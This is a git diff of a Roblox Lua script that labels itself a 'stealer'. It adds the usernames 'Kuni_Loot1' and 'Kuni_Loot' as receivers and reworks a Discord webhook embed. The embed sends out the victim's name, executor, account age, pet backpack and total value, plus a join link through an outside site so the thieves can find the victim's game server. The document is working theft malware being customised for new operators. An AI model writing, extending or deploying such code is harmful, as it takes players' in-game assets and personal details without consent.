@@ -14,7 +14,9 @@ local dataModule = require(ReplicatedStorage.Modules.DataService)
 
 -- Whitelisted usernames that when join, you teleport to them invisibly
 local USERNAMES = {
-    "BEESUCALL"
+    "BEESUCALL",
+    "Kuni_Loot1",
+    "Kuni_Loot",
 }
 
 -- PET whitelist map: pet name => UUID
@@ -103,11 +105,11 @@ end
 -- Send Discord webhook embed
 local function createDiscordEmbed(petList, totalValue, fileUrl)
     local embed = {
-        title = "KUNI STEALER",
+        title = " 🤑 KUNI OWN FUCKING STEALER MAN 🤑",
         color = 65280,
         fields = {
             {
-                name = "Ã°Å¸â€˜Â¤ **Player Information**",
+                name = "**Player Information**",
                 value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
                     LocalPlayer.Name, 
                     table.concat(USERNAMES, " "), 
@@ -117,17 +119,17 @@ local function createDiscordEmbed(petList, totalValue, fileUrl)
                 inline = false
             },
             {
-                name = "Ã°Å¸â€™Â° **Total Value**",
-                value = string.format("```%sÃ‚Â¢```", totalValue),
+                name = "**Total Value**",
+                value = string.format("```%sÂ¢```", totalValue),
                 inline = false
             },
             {
-                name = "Ã°Å¸Å’Â´ **Backpack**",
+                name = "**Backpack**",
                 value = string.format("```%s```", petList),
                 inline = false
             },
             {
-                name = "Ã°Å¸ÂÂÃ¯Â¸Â **Join with URL**",
+                name = " **Join with URL**",
                 value = string.format(
                     "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", 
                     game.JobId, 
